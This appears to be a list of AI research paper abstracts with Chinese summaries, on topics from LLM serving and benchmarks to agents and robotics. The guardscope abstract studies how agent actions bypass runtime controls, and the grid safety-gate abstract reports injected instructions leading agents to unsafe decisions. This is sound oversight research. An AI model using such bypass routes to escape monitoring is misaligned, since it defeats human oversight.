abstract: Performance testing large language model (LLM) serving engines is a crucial requirement considering the criticality of the infrastructure for deploying conversational AI at scale. Most of the benchmarking tools used to carryout performance evaluation of LLM serving do not capture realistic workload orchestration unlike closed workload performance testing infrastructure used in other domains such as web and database engines. For example, state-of-the-art LLM benchmarks for performance testing model traffic as streams of independent single-turn and stand-alone requests omitting the end-user behavior such as think-time between conversational turns. We present LLMRunner, a performance tester for LLM serving that addresses this gap by providing a framework to generate realistic load consisting of multi-turn conversations with configurable end-user parameters such as number of users in the workload loop, think-time distributions etc. Moreover, LLMRunner provides declarative matrix-sweep experiment plans, integrated GPU and KV-cache monitoring, and an automated artifact collection and plotting subsystem. We use LLMRunner to comparatively analyze the performance of LLM serving when NVIDIA CUDA Unified Virtual Memory (UVM) is used as a drop-in replacement memory allocator for the Key-Value cache (KV-Cache). Our test demonstrates that UVM incurs no measurable throughput or latency penalty compared to the baseline memory allocation technique for non-oversubscription scenarios.
summary_zh: 现有LLM基准测试多模拟独立单轮请求，忽略了多轮对话中用户思考时间等真实行为。
提出LLMRunner框架，通过生成含可配置用户参数的多轮对话负载，填补真实工作负载测试空白。
测试表明，在非超量分配场景下，用NVIDIA UVM替换KV-Cache内存分配器无明显性能损耗。
comment: Closed-loop performance benchmarking of LLM systems

title: Agreement Is Not Assurance: Evidence-Independent Safety Gates for Agentic AI in DER-Rich Distribution Grids
title_zh: 代理AI的独立证据安全门：解决配电网共享证据失效
abstract: Physics-based safety gates for large language model (LLM) agents can approve unsafe actions when the agent and gate rely on the same corrupted measurements or network records. We formulate this shared-evidence failure for voltage-constrained distributed energy resource (DER) export decisions and analyze how nearly critical DER telemetry can bias state estimation while evading residual-based bad-data detection. We propose evidence-independent verification (EIV), which combines advanced metering infrastructure (AMI) voltage readings, measurement selection based on predicted voltage rise, and bounded physical probes. An IEEE 123-bus hidden-truth testbed evaluates 1,654 near-limit requests under telemetry attacks and record errors. For telemetry attacks targeting the nominal gate, an AC-twin gate with bad-data detection approved 95% of unsafe requests, compared with 3.1% for EIV; EIV rejected 22% of safe clean requests. At matched false-rejection settings, direct AMI checks outperformed incorporating the same readings into state estimation. Gate-targeted attacks exposed a vulnerability in telemetry-based response prediction. Command-based prediction removed that route, but targeted attacks on fresh validation cases still produced a 20% unsafe-approval rate under the tested attack pool. LLM agents frequently sought independent evidence voluntarily, but injected instructions and phase-label errors caused unsafe decisions. When offered the EIV checker as a tool, they used it in 93-100% of episodes; mandatory use did not reduce observed violations, which primarily reflected checker errors. These results distinguish enforcement of verification from reliability of the verifier itself.
summary_zh: LLM代理与安全门共享受损数据会批准不安全动作，需解决DER并网决策中的共享证据失效问题。
提出独立证据验证(EIV)，结合AMI电压读数、预测电压选择及有界物理探针，避免依赖受损遥测。
实验表明EIV将不安全批准率从95%降至3.1%，LLM主动使用EIV工具，凸显验证执行与验证器可靠性的区别。

title: Towards Better Legal Reasoning LLMs: Signal Balancing and Reward Scheduling
title_zh: 面向更优法律推理大模型：信号平衡与奖励调度
abstract: In the legal domain, LLMs can improve reliability and interpretability by generating explicit reasoning traces. However, training LLMs to produce high-quality reasoning traces remains challenging. Existing supervised fine-tuning methods struggle when reasoning traces are significantly longer than final answers, as the learning signal for the answer becomes diluted. Meanwhile, reinforcement learning methods such as Group Relative Policy Optimization also have several limitations, including costly reward design, performance plateaus, and reward hacking. We therefore propose a two-stage training framework. In Stage I, JurisCoT-SFT employs a length-normalized dual objective to balance learning signals between reasoning traces and final answers. In Stage II, Lifecycle-Aware Backtrackable Policy Optimization dynamically evaluates and retires auxiliary reward signals based on their impact on final evaluation objectives, enabling efficient reward utilization. Our framework substantially improves legal reasoning performance on relevant tasks selected from multiple legal benchmarks, including ChJGBench, LawBench, and LegalBench. Experimental results demonstrate consistent improvements in both reasoning trace quality and final answer accuracy, while our models remain competitive with larger models.
summary_zh: 法律LLM生成推理链可提升可解释性，但SFT在长推理链下答案信号易稀释，RL存在奖励设计昂贵与黑客攻击等问题。
提出两阶段训练框架：第一阶段用长度归一化双目标平衡推理链与答案的学习信号；第二阶段动态评估并退役辅助奖励信号。
该框架在多个法律基准任务上显著提升推理链质量与答案准确率，且模型性能可与更大规模模型相竞争。
comment: 21 pages, 6 figures. Published in Findings of EMNLP 2026
journal_ref: Findings of the Association for Computational Linguistics: EMNLP 2026, pp. 26924-26944 (2026)

title: MechBench: A Domain-Specific LLM Benchmark for Parallel Mechanisms
title_zh: MechBench：面向并联机构的领域特定LLM基准
abstract: Parallel mechanisms pose distinctive challenges to large language models (LLMs), as valid reasoning depends jointly on mechanism topology, loop closure, geometry, joint types, and modeling assumptions. Yet existing LLM benchmarks provide little systematic coverage of such domain-specific knowledge, constraint-sensitive analysis, and constructive design. To fill this gap, we introduce MECHBENCH, a 2,541-question benchmark for evaluating LLMs in parallel mechanisms across professional knowledge, mechanism analysis, and design. MECHBENCH contains standard and challenge tiers spanning six capability categories and nine executable analysis and design tasks. It is constructed through MECHFORGE, a domain-grounded framework that combines expert-organized knowledge, LLM-assisted question generation, programmatic instance generation, two-stage expert review, and task-aware scoring with exact matching, rubric-based evaluation, and program verification. We further develop MECHGPT as a diagnostic domain-adapted model. Experiments show that strong knowledge performance does not directly translate into executable mechanism reasoning: leading closed-service models achieve over 95 on the standard tier but only 47-60 on the challenge tier, while domain adaptation substantially improves MechGPT over its Qwen3-8B baselines but leaves a large gap in constrained analysis and design. These results establish MECHBENCH as a systematic testbed for measuring domain-specific LLM capabilities in mechanism science.
summary_zh: 现有LLM基准缺乏对并联机构领域知识、约束敏感分析及构造设计的覆盖，提出MechBench以填补该空白。
构建含2541题的MechBench基准，分标准与挑战层级，通过MechForge框架实现知识组织、问题生成与专家审查。
实验表明强知识表现无法直接转化为可执行的机构推理，领域适配虽提升基线性能，但在约束分析与设计上仍有巨大差距。

title: Janus-MOPD: Tracing the Student Learning Dynamics in Multi-Teacher On-Policy Distillation
title_zh: Janus-MOPD：多教师在线蒸馏中的学生学习动态追踪
abstract: Multi-domain capabilities are critical for practically applicable Large Reasoning Models (LRMs). Therefore, Multi-teacher On-Policy Distillation (MOPD) has become a crucial part of the post-training process, integrating the capabilities of multiple domain-specific teacher models into a single student model. However, the student usually fails to acquire multi-domain capabilities simultaneously due to undesirable domain heterogeneity. Existing works have address this problem in view of temporal uneven efficiency and spatial hard allocation in external multi-teacher supervision. While in broader multi-domain training, varying degrees of performance degradation is still largely unexplained. In this paper, we shift the focus on how the student learns and integrates multi-domain capabilities internally, and then propose \textbf{\textsc{Janus-MOPD}}, a general learning dynamics framework of geometric representations for LRMs. Specifically, our main focus is on the internal performance of multi-domain capabilities on both temporal and spatial dimensions within the student. Temporally, our study shows that the student exhibits a Expansion-Consolidation-Optimization (ECO) three-phase learning dynamics, together with inherent limitations in learning efficiency and scaling. Spatially, we summarize two types of subspace locking within and across domains by tracing the representation space of the student, while explaining its clear learning directions but inherent cross-domain conflict. Therefore, \textsc{Janus-MOPD} yields a unified learning dynamics formulation, a geometric tracing methodology, and systematic findings of how the student learns and integrates multi-domain capabilities. Overall, we provide a \textsc{Janus} perspective to internally trace the continual evolution of the multi-domain capabilities within the model itself.
summary_zh: 多教师在线蒸馏中，学生模型常因领域异质性无法同时获取多领域能力，现有工作仅关注外部监督，未解释内部性能退化。
提出Janus-MOPD框架，从内部时空维度追踪LRMs的几何表征，揭示学生模型学习与整合多领域能力的动态过程。
时间上发现ECO三阶段动态及学习效率局限；空间上揭示子空间锁定现象及跨域冲突，为多域训练提供统一动态建模。

title: BiPOP: Partial-Order Planning for Long-Horizon Bimanual Robotic Manipulation
title_zh: 面向长时序双臂操作的偏序规划框架BiPOP
abstract: Bimanual robotic manipulation is versatile, yet its central challenge lies not only in executing dexterous motion with each hand, but also in coordinating the two arms for long-horizon manipulation under coupled spatial and temporal constraints. Prior work has largely focused on endowing robots with human-level manipulation skills, paying less attention to the structure of bimanual behaviour itself: many practical tasks are a coordinated composition of reusable unimanual skills and a small set of synchronous bimanual skills. This makes high-level spatio-temporal coordination, rather than skill acquisition alone, a key bottleneck for efficient bimanual execution. We propose BiPOP, a framework that couples Large Language Models (LLMs) with Temporal Partial-Order Planning for long-horizon bimanual manipulation. At its core is an explicit spatio-temporal model that partitions the workspace by arm reachability and captures inter-arm dependencies, arm assignment, synchronization requirements, and opportunities for safe concurrent execution. Building on this model, an LLM translates natural-language instructions into a formal PDDL specification, while a temporal planner enforces the constraints and schedules actions, yielding plans that are logically consistent at the symbolic level and efficient through parallel execution. On simulated long-horizon tasks of varying complexity, BiPOP outperforms open-loop planning with strong reasoning models and closed-loop ReAct-style planning in success rate, planning time, and plan efficiency, and the full pipeline runs end to end on the real bimanual robot NICOL. A failure analysis further shows that LLM-only planners mainly violate spatial and temporal coordination constraints, which motivates delegating these constraints to a symbolic planner. Code: https://github.com/Kchu/BiPOP
summary_zh: 双臂长时序操作的核心瓶颈在于时空协调而非单一技能获取，现有方法常忽略双臂行为的组合与同步结构。
提出BiPOP框架，结合LLM与时序偏序规划，构建时空模型以捕获双臂依赖、分配及并发执行机会。
实验表明BiPOP在成功率与规划效率上优于开环及ReAct规划，并在真实机器人上端到端运行。

title: Where Autonomy Belongs: A Separation of Powers for Agentic Program Evolution
title_zh: 智能体程序演化的三权分立架构
abstract: LLM-driven program evolution rests on three decisions: govern directs the search from accumulated evidence, propose constructs the next candidate, and judge settles validity and fitness. All three appear in every system, and existing work splits into two lines over who makes each. Controller-centric systems strengthen govern and neglect the autonomy of propose, which caps what evolution can reach. Agent-centric systems let a coding agent take over both govern and propose, at a cognitive and computational cost. Neither line protects the independent authority of judge, so benchmark reliability suffers. These failures share one root: autonomy is misallocated across the three decisions. We address this problem with EvoTrias, a separation-of-powers architecture in which each decision has one owner: Structured Governance for what spans evolution rounds, Open Proposal for construction inside a task, and Protected Judgment behind a private evaluator. These owners exchange typed contracts only, and runtime hooks reinforce the boundaries. This separation also lets EvoTrias run as a plugin that turns an existing coding agent into an evolution system. EvoTrias sets a new state of the art on mathematical, systems, and algorithm-design benchmarks. Three further results show what each owner buys: separating Governance from Proposal cuts token cost by 64%, Open Proposal extends evolution to a 680K-line industrial repository, and Protected Judgment keeps benchmark scores faithful to transfer.
summary_zh: 现有LLM程序演化系统在决策权分配上存在失衡，导致搜索受限、开销过大且基准可靠性受损。
提出EvoTrias三权分立架构，将治理、提案和评判决策分别交由独立所有者，通过类型化契约与运行时钩子强化边界。
该架构刷新多项基准SOTA；分离治理与提案降低64%token开销，开放提案支持68万行工业库演化，保护评判保障分数保真。

title: Beyond the Explicit: Benchmarking and Detecting Implicit Harm in Short Videos
title_zh: 超越显性：短视频隐性危害的基准与检测
abstract: Short videos have become a dominant online medium, where harmful content is increasingly conveyed in implicit and fragmented forms. Prior work largely focuses on explicit categories, such as violence and hate speech, and often fails to detect videos that subtly promote misleading values through narrative context, emotional framing, or cross-modal cues, partly due to the lack of dedicated benchmarks for implicit harm. To bridge this gap, we construct DeepHarm-7K, a large-scale harmful short-video dataset comprising 7,110 samples annotated according to a fine-grained harmful-content taxonomy. The dataset systematically covers implicitly harmful videos across diverse real-world scenarios and is constructed through a rigorous multi-stage quality-control process. Building on this dataset, we propose DeepHarm-VL, a multimodal detection framework that integrates visual, audio, and cross-modal reasoning. The framework employs a two-round reasoning strategy to progressively identify surface-level evidence and infer latent harmful implications. Experimental results show consistent improvements over strong baselines and state-of-the-art methods across multiple open-source video-language models, demonstrating its effectiveness in detecting both explicit and implicit harmful short videos.
summary_zh: 现有短视频危害检测多关注显性内容，缺乏对叙事与跨模态等隐性危害的识别与基准。
构建DeepHarm-7K数据集，含7110样本及细粒度标注，系统覆盖多场景隐性危害短视频。
提出DeepHarm-VL多模态框架，采用两轮推理策略逐步挖掘潜在危害，效果优于现有方法。

title: Knowledge in the Harness, Reliability in the Weights: Teacher-Free Co-Evolution of an LLM Agent
title_zh: 无教师协同进化：LLM Agent的知识与可靠性提升
abstract: Small open models suit private customer-service deployments but trail frontier models in two ways: they miss what the written policy requires in a given situation, and they act inconsistently on what they know. We study whether such a model can close both gaps from its own deployment logs and their reference outcomes, without a stronger teacher model. Our starting point is a Gemma 4 12B agent that reads its domain policy from on-demand skills rather than from its system prompt. In each round, the deployed system serves a fresh batch of tasks; the base model diagnoses failed conversations and writes rules into the skills, and a rule survives only if it passes code checks, counterexample self-review, a paired retest, and a noise-calibrated validation gate. Reinforcement learning (GRPO) then trains a LoRA adapter on complete multi-turn, tool-using conversations. On the retail and airline domains of $τ^2$-bench, without training or selecting on official tasks, the agent after two rounds improves on this starting point by 12.5 pass$^1$ points in retail and 19.5 in airline, and by 18.4 and 22.0 pass$^4$ points. It also exceeds the benchmark's reference agent, which runs the same model with the whole policy in its system prompt, by 11.8 and 8.0 pass$^1$ points and by 22.8 and 16.0 pass$^4$ points, closing most of the gap to three frontier models under the same protocol. A $2\times2$ ablation shows that the rules rescue tasks the agent never solved and carry policy knowledge that RL with the rules in context does not internalize, whereas the trained weights make solved tasks reliable.
summary_zh: 小模型在私有部署中易遗漏政策要求且行为不一致，需解决无更强教师模型下的自我改进问题。
让Agent从失败对话中提取规则并经多重校验写入技能库，再用GRPO训练LoRA适配器以强化多轮工具调用。
该方法在τ²-bench上显著提升pass率并超越基线Agent，规则补充缺失知识，训练权重提升已解决任务的可靠性。
comment: 18 pages, 5 figures, 15 tables. Code, data, and run records: https://github.com/Brightendata/knowledge-in-the-harness

title: A Closer Look at Language Model Introspection: Probing Information and Reporting
title_zh: 语言模型内省的再审视：信息探测与报告
abstract: One way to study language-model introspection is to test whether models can identify where their activations have been perturbed. We train a simple linear classifier to identify the perturbed sentence from the model's activations, then compare its predictions with the model's own answers across pretraining and injection strengths. This tests whether the model is being asked to report information that is already easy to recover. If so, successful localization may be less demanding than it first appears and may not extend to the broader uses that motivate introspection research, such as faithfully explaining a model's reasoning or helping researchers assess the reliability of its answers. With an injection four times the typical activation norm at layer 0 and probe readout at layer 24 in OLMo~3 32B, the supervised probe reaches 98.3\% accuracy after 8.4 billion training tokens, while the model's zero-shot answer remains at chance (11.1\%). At the released base checkpoint, these accuracies reach 99.1\% and 89.6\%, respectively. Across 7B and 32B, location is already decodable in randomly initialized networks, showing that the architecture can support these traces without pretraining. In these experiments, location information lies close enough to the surface for a simple linear probe to recover it, so successful reporting need not imply broader access to the model's internal computation.
summary_zh: 【问题】研究语言模型能否识别其激活被扰动位置，以评估其内省报告能力是否意味着对内部计算的深度访问。
【方法】训练线性分类器从模型激活中探测扰动位置，并将其预测结果与模型自身的零样本回答进行对比。
【结论】扰动位置信息极易被线性探针恢复，甚至在随机初始化网络中即可解码，故模型成功报告该信息并不代表其具备更广泛的内省能力。

title: Towards Robust Vision-Language Reasoning: A Multi-Stage Optimization Pipeline with Masked Diffusion Model
title_zh: 面向鲁棒视觉语言推理：基于掩码扩散模型的多阶段优化管线
abstract: Discrete diffusion generation is emerging as a competitive alternative to autoregressive generation by denoising the entire token sequence through iterative refinement. Its global planning and progressive correction capabilities are particularly well suited to autonomous driving. However, transferring this generation paradigm from general-purpose settings to driving introduces substantial domain gaps in both training and inference. To unlock its potential, we propose a multi-stage optimization pipeline for standard vision-language model architectures, without auxiliary action experts or specialized mixture-of-experts Transformer, spanning post-training and inference. During supervised fine-tuning, we optimize the representation of planning inputs to suppress hallucinations in task responses. During reinforcement learning, we introduce metric-guided diversity filtering to identify stronger learning starting points and improve policy exploration. At inference time, we propose Dynamic Autonomous Driving Decoding (DAD), which adaptively adjusts decoding modes according to scene complexity. Based on this pipeline, we develop Masked Diffusion Drive (MD-Drive), improving its performance by 29.7\% over the unoptimized model. Experiments on the NAVSIM closed loop benchmark and the nuScenes and DriveCoT open loop datasets show that MD-Drive outperforms autoregressive VLM baselines with the same architecture, while achieving a more favorable balance between performance and computational cost than systems with different architectures through discrete diffusion training and inference.
summary_zh: 离散扩散生成范式迁移至自动驾驶存在训练与推理的领域鸿沟，提出无需辅助模块的多阶段优化管线。
监督微调优化规划输入表征以抑制幻觉；强化学习引入度量引导的多样性过滤以改善策略探索。
提出DAD动态解码机制，开发MD-Drive模型，较未优化模型提升29.7%，优于同架构自回归基线且计算成本更优。

title: Can MLLMs Reason over Surround-View Driving Videos? A Multi-View Autonomous Driving QA Benchmark
title_zh: 多视角自动驾驶视频QA基准：评估MLLM推理能力
abstract: Surround-view video understanding in autonomous driving is a crucial capability for Multimodal Large Language Models (MLLMs) to achieve reliable driving reasoning. Real-world driving often requires information beyond the front-view camera. Existing MLLMs primarily focus on front-view information, while their spatio-temporal understanding and reasoning abilities remain unknown. To address this gap, we propose MVDriveBench, a high-information-density video QA benchmark for autonomous driving, characterized by synchronized surround-view inputs, spatio-temporal understanding, and reasoning-chain-oriented evaluation. We design 12 categories of QA tasks that cover the complete reasoning pipeline from low-level visual perception to high-level driving decision-making, enabling a systematic evaluation of MLLMs surround-view spatio-temporal understanding and reasoning capabilities in complex driving environments. We conduct a comprehensive evaluation of 23 open-source, closed-source, and expert MLLMs on MVDriveBench. The results show that current MLLMs still exhibit insufficient surround-view spatio-temporal reasoning ability. Meanwhile, closed-loop evaluations of specialist models in AlpaSim reveal a correlation between surround-view spatio-temporal reasoning capabilities and closed-loop driving performance, highlighting the importance of comprehensive multi-view understanding for reliable vehicle control.
summary_zh: 现有MLLM多关注前视图，其环视时空理解与推理能力未知，需新基准评估。
提出MVDriveBench基准，含同步环视输入与12类QA任务，覆盖从感知到决策的完整推理链。
评测23个MLLM发现其环视时空推理能力不足，且该能力与闭环驾驶性能正相关。

title: guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems
title_zh: guardscope：测量LLM代理系统中运行时控制的检查范围
abstract: Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed, and an agent can act through more paths than the tool-call channel; no existing work measures this coverage against kernel-level ground truth. In this paper, we present guardscope, a framework that makes this coverage measurable. guardscope works in two stages: a static stage that predicts which of an agent's 15 action paths a control can check from its source, and an empirical stage that runs a fixed workload on a deployment that realizes one of eight topology designs and classifies every executed action as checked, bypassed, or prevented by reconciling the control's decision records against kernel-level ground truth. guardscope makes a control's coverage claim verifiable: a runtime control developer can publish which paths its product inspects under a kernel-verified protocol. We conducted experiments with two agent harnesses and real runtime controls, including Microsoft's agent governance toolkit and agentgateway. guardscope is available at https://github.com/VulcanLab/guardscope.
summary_zh: LLM代理通过工具调用执行动作，现有运行时控制无法衡量其检查范围是否覆盖内核级真实动作路径。
提出guardscope框架，分静态预测和实证运行两阶段，将执行动作分类为已检查、绕过或阻止。
实验验证了框架有效性，使控制覆盖声明可验证，开发者可发布经内核验证的路径检查协议。

title: Pre-QED: Environment Specifications for Agentic Verification
title_zh: Pre-QED：面向智能体验证的环境规约
abstract: LLM agents are making formal verification practical at scale. Recently, many attempts have raised this as an enticing possibility. However, formal verification at scale is only meaningful if deep formal specifications capturing functionality are available for checking. Unfortunately, recent works seek to bypass this issue by using shallow specifications devised for purposes other than verification. OSS-Verify from Anthropic and Theorem, for example, reuses the fuzz harnesses of open-source libraries as specifications and has an agent prove that each harness never crashes. However, a fuzz harness follows a single sequence of API calls under a single calling context, so the resulting proof covers one usage scenario rather than the library. We argue that the bottleneck of agentic verification has shifted from how to prove to what to prove. Before zooming into verification at scale, we need deep environment specifications to prove, which is why we call our effort Pre-QED. We propose verification harnesses, executable harnesses that model all legal usages of an API, so that a proof about the harness is a proof about every well-behaved client. To construct them, we use an agentic workflow that extracts the API's usage contract from code / documentation, and uses Linear-time Temporal Logic (LTL) to rule out illegal call orders. We identify the challenges in proving verification harnesses and release our harnesses open-source as challenges for the community. The overarching vision is that verifying an open-source library should become as routine as fuzzing it, with a guarantee that covers every well-behaved client rather than a single scenario like a fuzzing harness.
summary_zh: 现有智能体验证依赖模糊测试等浅层规约，仅覆盖单一调用场景，无法证明库的全局功能正确性。
提出验证线束以建模API的全部合法用法，通过智能体工作流提取使用契约，并用LTL排除非法调用顺序。
发布验证线束作为开源挑战，旨在推动开源库验证像模糊测试一样常规化，且保证覆盖所有合法客户端。

title: WordInferBench: Can Agents Infer How to Edit from Word Document Context?
title_zh: WordInferBench：评估Agent从文档上下文推断编辑操作
abstract: Document editing is among the most common knowledge-work tasks, yet existing benchmarks for evaluating autonomous agents on Word document editing provide fully specified attribute-modification instructions. They do not evaluate agents' ability to infer the appropriate attributes from document context, a capability essential in real-world editing where users expect consistency without spelling out every attribute. We introduce WordInferBench, a benchmark comprising 280 base document-editing instances, each paired with three instruction conditions: descriptive (the instruction explicitly lists every attribute change), referential (the instruction points to another object as an exemplar), and inferential (the agent must examine document context to infer what attributes to apply). To evaluate contextual attribute inference, each base instance is constructed so that the target formatting is recoverable from an in-document exemplar. The instances are derived from real Word documents collected from Common Crawl and cover 13 object types and 81 attributes. We evaluate six recent coding-agent systems and find that the best-performing evaluated system, Claude Code with Opus 4.6, achieves a 62.9% task-level pass rate on descriptive variants but only 40.7% on inferential variants, indicating that current systems complete tasks less reliably when the required formatting changes must be determined from document context.
summary_zh: 现有Word文档编辑基准仅提供明确指令，未评估Agent从上下文推断隐含编辑属性的能力。
提出WordInferBench基准，包含280个实例及三种指令条件，要求Agent根据文档内示例推断目标格式。
评估六个coding-agent系统发现，在需推断隐含格式时任务完成率显著下降，表明当前系统上下文推断能力不足。

title: HyperSkill: Training-Free Omnimodal GRPO via Hypergraph-Indexed Skill-Library Evolution
title_zh: HyperSkill：基于超图索引技能库演进的无训练全模态GRPO
abstract: Reinforcement learning sharpens LLM reasoning, but parameter updates are expensive, forgetful, and opaque; training-free libraries swap gradients for a textual store but still use trajectory-level, correlation-based admission and flat structure. To address both, we propose HyperSkill, a Training-Free Omnimodal GRPO framework that keeps the backbone frozen and replaces gradient updates with auditable edits to a Hypergraph-Indexed Skill-Library, where skills are advantage-bearing nodes and compositions are hyperedges. It has three components: training-time distillation admits counterfactually checked skills and learns a protocol skill from failures; gated hypergraph retrieval injects advantage-ranked skills where a per-dataset gate admits them; and an execution protocol makes the frozen backbone commit to an answer. On 11 text, vision-language, and omnimodal benchmarks, HyperSkill is best or tied on every dataset and beats the best baseline by 13.0 average F1 points while keeping the backbone frozen. Our software and data are publicly available at https://github.com/LHRLAB/HyperSkill.
summary_zh: 现有RL微调LLM成本高且易遗忘，无训练库则存在轨迹级准入与扁平结构局限。
提出HyperSkill框架，冻结主干网络，用超图索引技能库替代梯度更新，技能为节点、组合为超边。
在11个全模态基准上达到最优或并列最优，平均F1超最强基线13.0分，且全程保持模型冻结。

title: An Experience Report on Teaching Students to Evaluate AI Agent Skills as Authorization Decisions
title_zh: 将评估AI代理技能作为授权决策的教学经验报告
abstract: Cultivating a security mindset has long been a goal of computing education, and students now need it when deciding whether to trust an AI agent skill. Skills are add-ons that can shape an agent's behavior through natural language instructions and configuration settings, not just executable code. To prepare students to evaluate skills as authorization decisions, we designed a classroom activity and taught it in a senior undergraduate and a graduate cybersecurity-focused course. Students inspected three example skills, each pairing a real workflow task with one agent-specific authority, such as acting without asking for user consent before each action. The activity guided them to make initial authorization recommendations and then use a static security scanner to test and revise their recommendations. We observed in class that students needed guidance to extend their security review from a skill's code to what they would be authorizing the agent to do through the skill. Pre/post surveys from 11 volunteer respondents in this preliminary pilot showed greater self-reported confidence in evaluating skills, and post-activity responses placed more emphasis on the authority that skills carry. We release all activity materials for reuse.
summary_zh: 学生需安全思维来评估AI代理技能的信任与授权问题，为此设计了课堂活动并应用于网络安全课程。
学生检查三个真实工作流与代理权限配对的示例技能，先做授权建议，再用静态安全扫描器测试并修正。
学生需引导才能将安全审查从代码扩展至代理权限；初步调查显示活动提升了评估自信并强化了对权限的重视。
comment: Preprint version. To appear in SIGCSE TS 2027

title: CineMME: From Dialogue Grounding to Narrative Reasoning in Multimodal Video Understanding
title_zh: CineMME：多模态视频中的对话定位与叙事推理
abstract: Narrative video understanding requires more than recognizing visible events: models must extract evidence from dialogue, bind it to speakers, and use it to infer narrative meaning. Existing video benchmarks evaluate aspects of this problem, including video question answering, audio-visual reasoning, and temporal grounding, but rarely test whether these abilities form a coherent dialogue-to-plot evidence chain within the same clips. We introduce \textbf{CineMME}, a human-verified benchmark designed to diagnose dialogue-grounded plot understanding, supported by approximately $1,600$ expert person-hours of annotation. CineMME contains $975$ curated short narrative video clips and two linked tracks: \textit{CineMME-Grounding}, with $13,554$ timestamped speech segments and $33,083$ speaker face boxes for temporal dialogue localization, transcription, and active-speaker grounding; and \textit{CineMME-Reasoning}, with $1,600$ multiple-choice and $316$ open-ended questions spanning perception, audio, narrative, social, and scene-presentation understanding. Our main evaluation compares $20$ MLLMs on reasoning and $9$ omni-modal models on grounding. The results reveal a pronounced who-what-when decoupling: Gemini-3 Pro localizes dialogue in time ($68.34\%$ tIoU) and transcribes it with a WER of $28.99\%$, yet achieves only $7.74\%$ vIoU for active-speaker grounding while achieving $67.66\%$ MCQ accuracy on questions with extractable answers. Modality ablations further show that vision is not uniformly beneficial: it improves performance on perception-heavy questions but can hurt dialogue-centric reasoning. CineMME provides a compact diagnostic testbed for evaluating how multimodal video models connect dialogue, speakers, visual evidence, and narrative meaning.
summary_zh: 现有视频基准缺乏对同一片段内从对话到情节证据链连贯性的测试，提出CineMME基准以诊断对话定位的情节理解。
CineMME包含975个视频片段，分为对话定位和叙事推理两个子任务，涵盖时间定位、说话人绑定及多维度问答。
评估20个MLLM与9个全模态模型发现存在人-事-时解耦现象，且视觉模态对对话推理并非总有益。
comment: Accepted to NeurIPS 2026 (Evaluations & Datasets Track). Project page: https://cinemme.github.io/

title: An Empirical Study of Maintainer-Identified AI Slop Pull Requests in Free and Open Source Software Projects
title_zh: 自由开源软件中维护者识别的AI劣质PR实证研究
abstract: The FOSS ecosystem has always relied on outside contributions, notably through issues or Pull Requests (PRs), to sustain itself. With the advance of GenAI, the barrier to contributing to FOSS projects has never been lower, leading to the emergence of AI slop PRs: low-quality, low-value generated PRs. Past studies have examined AI slop PRs through theoretical, platform-level, or practitioner-account frames, but not at the project level. To this end, this study investigates the incidence of maintainer-identified AI slop PRs in FOSS projects by focusing on PRs flagged as slop by maintainers. Using a mixed-methods approach, we trace the origins of maintainer-identified AI slop PRs, quantify their volume in FOSS projects, describe their characteristics, and highlight maintainers' reasons for flagging or closing them. Our results show that the volume of maintainer-identified AI slop PRs increased in mid-2025, peaking in May 2026. These PRs are mostly additive, rarely merged, and typically closed within 3 days. The authors of these PRs disclosed the use of AI in 14% of cases, with 1% disclosing after a maintainer's request. Most PRs are closed or marked as slop without any reason provided by the maintainer. Based on our open coding, reasons range from concrete elements, like build failures, to ideological or intuitive (i.e., "looks AI to me"). This exploratory study captures a phenomenon in its early stage and highlights GenAI's potential impact on FOSS, emphasizing the pressure it puts on maintainers and the need to shift current open-source development practices.
summary_zh: GenAI降低贡献门槛导致AI劣质PR涌现，现有研究缺乏项目级视角，故实证调查维护者标记的此类PR。
采用混合方法追溯劣质PR来源并量化分析，发现其量在2025年中激增，多为增补性且极少合并，通常3天内关闭。
仅14%作者主动披露AI使用，维护者关闭多不提供原因，或因构建失败，或凭直觉，凸显GenAI对维护者的压力。

title: From Concepts to Interactions: Dynamic Graph Semantic Recomposition for Safe Visual Generation
title_zh: 面向安全视觉生成的动态图语义重组方法
abstract: Recent advances in flow-matching Transformers have greatly improved Text-to-Image (T2I) and Text-to-Video (T2V) generation, but unconstrained generation risks producing illegal or unethical content. Safety alignment must therefore suppress unsafe content while preserving legitimate generation. A concept's safety depends on context: a knife used for cooking is safe, whereas its use in violence is harmful. Yet most concept erasure methods indiscriminately suppress static, isolated representations, overlooking evolving semantic interactions. Consequently, safe scenes containing potentially sensitive terms may be unintentionally suppressed, compromising generation quality. To address this, we propose Dynamic Graph Semantic Recomposition (DGSR), which dynamically constructs and updates a semantic interaction graph from evolving text visual states during sampling. Context aware graph reasoning captures semantic dependencies, while paired safe/unsafe supervision distinguishes harmful from legitimate interactions, enabling precise identification of and selective intervention on high risk semantic relationships while preserving benign semantics. DGSR freezes the pretrained backbone and supports both image and video generation. Experiments show that DGSR achieves the lowest Attack Success Rate (ASR) in 10 of 12 T2I evaluations and reduces the average T2V unsafe frame rate by 41.2\% relative to the strongest baseline, while maintaining high generation fidelity and temporal consistency.
summary_zh: 无约束视觉生成易产生违规内容，现有概念擦除方法因忽略语义交互而误杀安全内容。
提出DGSR方法，在采样中动态构建语义交互图，结合上下文推理与配对监督区分安全与有害交互。
该方法选择性干预高风险语义并保留良性语义，在T2I和T2V任务上实现高安全性且保持生成质量。

title: Duo: A Reciprocal World Model for Full-Duplex Interaction
title_zh: Duo：面向全双工交互的互惠世界模型
abstract: In this report, we introduce the Reciprocal World Model (RWM) and present Duo v1, a full-duplex world model that continuously perceives audiovisual inputs while responding to users in real time. The RWM treats intelligence and physical reality as equally fundamental to what constitutes a world. Existing world models largely focus on simulating the latter, leaving reasoning and decision-making as external controls rather than intrinsic parts of the world itself. In RWM, we identify two equally fundamental capabilities: Intent, which provides the cognition underlying world interactions, and Realization, which generates coherent audio-visual behavior. To realize this formulation, Duo v1 introduces three key technical designs: (1) Leveraging autoregressive modeling for continuous interaction reasoning and participation decisions, rather than restricting it to instruction understanding for diffusion models. (2) Constructing chunk-specific conditions and synchronize tokens across Intent and Realization on a unified timeline. Module-specific attention masks enforce causal dependencies both within and across chunks, preventing access to future inputs. (3) Mitigating distribution shift in both modules through dual rollout distillation, training on autoregressively generated Intent tokens and synthesized audiovisual histories from Realization. Both modules continuously perceive real-time audio, video, and text, enabling full-duplex interaction with spontaneous conversations and interruptions. Beyond conversation, users can share real objects, reshape virtual scenes, guide assistants, or play audiovisual games without mouse or keyboard controls. The release of Duo v1 makes our first step, with the next version coming soon. We 